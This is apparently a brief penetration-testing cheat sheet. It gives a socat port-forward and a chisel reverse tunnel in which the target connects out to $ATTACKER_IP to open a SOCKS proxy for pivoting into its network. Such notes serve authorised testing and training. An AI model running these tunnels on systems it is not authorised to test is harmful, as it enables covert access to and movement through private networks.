# port forwarding

Forward port 80 to 445

```
socat TCP-LISTEN:80,fork TCP:127.0.0.1:445
```

# tunneling through chisel
Tunnel through 443 and open a socks proxy on attacker localhost.
## Attacker
```
./chisel server --port 443 --reverse
```
## Target
```
./chisel client $ATTACKER_IP:443 R:socks
```
